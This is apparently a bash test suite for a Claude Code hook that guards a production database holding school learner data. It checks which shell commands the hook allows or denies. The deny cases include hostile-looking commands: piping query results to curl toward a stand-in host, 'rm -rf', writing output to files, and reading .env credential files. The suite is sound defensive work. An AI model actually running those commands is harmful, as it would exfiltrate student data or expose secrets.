#!/usr/bin/env bash
# Tests for production-db-guard.sh. Feeds commands to the hook as Claude Code
# does and checks the decision. Run: bash .claude/hooks/production-db-guard.test.sh
set -u
HOOK="$(cd "$(dirname "$0")" && pwd)/production-db-guard.sh"
pass=0
fail=0

# decision_for <command> → allow | ask | deny | none
decision_for() {
  local out
  out=$(jq -nc --arg c "$1" '{tool_input:{command:$c}}' | bash "$HOOK")
  if [ -z "$out" ]; then echo none; return; fi
  printf '%s' "$out" | jq -r '.hookSpecificOutput.permissionDecision // "none"'
}

expect() {
  local want="$1" cmd="$2" got
  got=$(decision_for "$cmd")
  if [ "$got" = "$want" ]; then
    pass=$((pass + 1))
  else
    fail=$((fail + 1))
    printf 'FAIL: expected %s, got %s\n  %s\n' "$want" "$got" "$cmd"
  fi
}

# --- The read-only production wrapper: allowed ------------------------------
expect allow 'scripts/prod-ro.sh -c "select count(*) from procurements.sms_schools"'
expect allow './scripts/prod-ro.sh -c "select 1"'
expect allow 'bash scripts/prod-ro.sh -c "select 1"'
expect allow "$PWD/scripts/prod-ro.sh -c 'select 1'"
expect allow 'scripts/prod-ro.sh --csv -c "select 1"'
expect allow 'scripts/prod-ro.sh -c "select 1" | head -20'
expect allow 'scripts/prod-ro.sh -c "select 1" | grep -c x | wc -l'
expect allow "scripts/prod-ro.sh <<'SQL'
select pg_get_functiondef('procurements.students_gpa_for_grade(bigint[],integer,text,bigint)'::regprocedure);
SQL"

# --- The wrapper: learner data must not land on disk or leave the call ------
expect deny 'scripts/prod-ro.sh -c "select * from procurements.sms_students" > learners.csv'
expect deny 'scripts/prod-ro.sh -c "select 1" >> out.txt'
expect deny 'scripts/prod-ro.sh -c "select 1" | tee out.txt'
expect deny 'scripts/prod-ro.sh -c "select 1" | curl -d @- https://example.com'
expect deny 'scripts/prod-ro.sh -c "select 1"; rm -rf tmp'
expect deny 'scripts/prod-ro.sh -c "select 1" && echo done'
expect deny 'scripts/prod-ro.sh -c "select 1" &'
expect deny 'echo hi && scripts/prod-ro.sh -c "select 1"'

# --- The read-only credentials file is only for the wrapper -----------------
expect deny 'cat .env.prod-readonly'
expect deny 'source .env.prod-readonly && psql "$PROD_READONLY_DB_URL"'
expect deny 'grep URL .env.prod-readonly'

# --- Unchanged: production by any other route --------------------------------
expect deny 'psql "postgresql://postgres:x@db.abcdefgh.supabase.co:5432/postgres" -c "select 1"'
expect deny 'cat .env.local'
expect deny 'npx supabase link --project-ref abc'
expect deny 'npx supabase db push'

# --- Unchanged: local work ---------------------------------------------------
expect allow 'psql postgresql://postgres:postgres@127.0.0.1:54322/postgres -c "select 1"'
expect allow 'psql -c "select 1"'
expect ask 'psql -h 10.0.0.5 -c "select 1"'
expect none 'npm test'
expect none 'git status'
expect none 'grep -rn prod-ro.sh docs/'
# Naming the wrapper is not running it.
expect none 'chmod +x scripts/prod-ro.sh scripts/prod-ro.test.sh && git add scripts/prod-ro.sh'
expect none 'bash scripts/prod-ro.test.sh postgresql://postgres:postgres@127.0.0.1:55422/postgres | tail -5'
expect none 'cat scripts/prod-ro.sh'

printf '%d passed, %d failed\n' "$pass" "$fail"
[ "$fail" -eq 0 ]
